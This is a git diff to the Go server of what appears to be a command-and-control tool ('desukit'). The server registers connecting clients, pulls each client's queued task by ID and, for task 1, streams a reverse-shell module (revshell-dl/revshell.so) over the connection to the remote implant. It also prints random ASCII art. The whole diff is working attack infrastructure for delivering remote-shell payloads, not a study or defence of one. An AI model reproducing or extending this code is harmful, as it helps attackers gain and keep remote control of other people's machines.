@@ -7,6 +7,7 @@ import (
     "os"
     "io"
     "time"
+    "math/rand"
     "unicode/utf8"
 
     "desukit/asciiArt"
@@ -33,9 +34,11 @@ func main() {
     CONN_HOST := viper.GetString("listener.host")
     CONN_PORT := viper.GetString("listener.port")
     CONN_TYPE := "tcp"
-    
-
-    asciiArt.PrintArt1()
+    min := 1
+    max := 4 
+    rand.Seed(time.Now().UnixNano())
+    n := min + rand.Intn(max-min+1)
+    asciiArt.PrintArt(n)
 
     // ----------- START DB -----------------------
     // database functionality. sqldb makes the database a global variable
@@ -70,44 +73,43 @@ func main() {
     }
 }
 
-// Task execution
-func executeTask(client model.Client, task model.Task, conn net.Conn) {
-    switch task.Task_ID {
-    case 1:
-        message := "1"
-        conn.Write([]byte(string(message)))
-        tasks.ClearTaskQueue(client)
-    }
-}
 
-// Send file over network
-func sendModule(conn net.Conn) {
-    fmt.Println("Sending module...")
+// Send module over network
+func sendModule(conn net.Conn, task_id int) {
     defer conn.Close()
     pwd, _ := os.Getwd()
-    file, err := os.Open(pwd+"/task_modules/revshell-dl/revshell.so")
-    if err != nil {
-        fmt.Println(err)
-        return
-    }
 
-    _, err = file.Stat()
-    if err != nil {
-        fmt.Println(err)
-        return
-    }
+    switch task_id {
+    case 1:
+        file, err := os.Open(pwd+"/task_modules/revshell-dl/revshell.so")
+        if err != nil {
+            fmt.Println(err)
+            return
+        }
 
-    //fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
-    //fileName := fillString(fileInfo.Name(), 64)
-    buffer := make([]byte, 512)
-    fmt.Println("Sending file...")
-    for {
+        _, err = file.Stat()
+        if err != nil {
+            fmt.Println(err)
+            return
+        }
+
+        buffer := make([]byte, 512)
+        fmt.Println("Sending module...")
+
+        for {
             _, err = file.Read(buffer)
             if err == io.EOF {
                 break
             }
             conn.Write(buffer)
+        }
     }
+    min := 1
+    max := 4 
+    rand.Seed(time.Now().UnixNano())
+    n := min + rand.Intn(max-min+1)
+    asciiArt.PrintArt(n)
+
     fmt.Println("Sent ;)")
     return
 
@@ -146,17 +148,15 @@ func handleRequest(conn net.Conn) {
         if !exists {
             client.RegisterClient(C)
         } else { 
-            fmt.Println("\nChecking for task...")
             task_exists := tasks.CheckTasks(C)
             if task_exists {
                 fmt.Println("Executing task...")
-                //T := tasks.GetTask(C)
+                T := tasks.GetTask(C)
+                task_id := T.Task_ID
+                sendModule(conn, task_id)
                 fmt.Println("Clearing task queue...")
                 tasks.ClearTaskQueue(C)
-                sendModule(conn)
             } else {
-                //message := "accepted"
-                //conn.Write([]byte(string(message)))
                 conn.Close()
             }
         }
